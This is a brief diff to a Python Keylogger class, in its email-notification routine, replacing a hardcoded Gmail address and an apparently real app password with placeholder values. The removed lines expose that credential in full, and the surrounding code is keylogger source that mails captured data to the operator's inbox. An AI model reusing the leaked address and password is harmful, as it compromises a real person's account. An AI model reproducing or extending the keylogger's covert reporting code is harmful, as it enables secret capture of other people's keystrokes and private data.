@@ -71,9 +71,9 @@ class Keylogger:
         print('[SENDING EMAIL NOTIFICATION]')
 
         # Define email sender and receiver
-        email_sender = "mrpentesterqwerty@gmail.com"
-        email_password = "pvuucziqhcbscauw"
-        email_receiver = "mrpentesterqwerty@gmail.com"
+        email_sender = "SENDER_EMAIL_HERE@gmail.com"
+        email_password = "YOUR_PASSWORD"
+        email_receiver = "RECEIVER_EMAIL_HERE@gmail.com"
 
         # Set the subject and body of the email
         subject = 'test!'
